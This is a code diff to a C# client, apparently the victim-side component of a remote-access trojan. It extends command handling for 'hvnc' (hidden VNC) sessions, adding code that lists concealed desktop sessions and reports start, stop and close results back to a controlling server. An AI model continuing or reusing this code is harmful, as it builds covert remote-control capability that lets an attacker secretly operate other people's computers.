@@ -2983,7 +2983,21 @@ namespace winClient48
                 {
                     if (cmd[1] == "window")
                     {
-                        if (cmd[2] == "start")
+                        if (cmd[2] == "init")
+                        {
+                            List<List<string>> ls2d = new List<List<string>>();
+                            foreach (var session in m_lsHVNC)
+                                ls2d.Add(new List<string>() { session.m_szDesktopName, session.m_bRunning ? "True" : "False" });
+
+                            v.fnSendCommand(new string[]
+                            {
+                                "hvnc",
+                                "window",
+                                "init",
+                                clsEZData.fn2dListToString(ls2d),
+                            });
+                        }
+                        else if (cmd[2] == "start")
                         {
                             string szName = cmd[3];
                             string szExe = cmd[4];
@@ -3003,7 +3017,12 @@ namespace winClient48
 
                             v.fnSendCommand(new string[]
                             {
-
+                                "hvnc",
+                                "window",
+                                "start",
+                                szName,
+                                szExe,
+                                "1",
                             });
                         }
                         else if (cmd[2] == "stop")
@@ -3018,7 +3037,11 @@ namespace winClient48
 
                             v.fnSendCommand(new string[]
                             {
-
+                                "hvnc",
+                                "window",
+                                "stop",
+                                szName,
+                                "1",
                             });
                         }
                         else if (cmd[2] == "close")
@@ -3038,7 +3061,10 @@ namespace winClient48
 
                             v.fnSendCommand(new string[]
                             {
-
+                                "hvnc",
+                                "window",
+                                "close",
+                                "1",
                             });
                         }
                     }
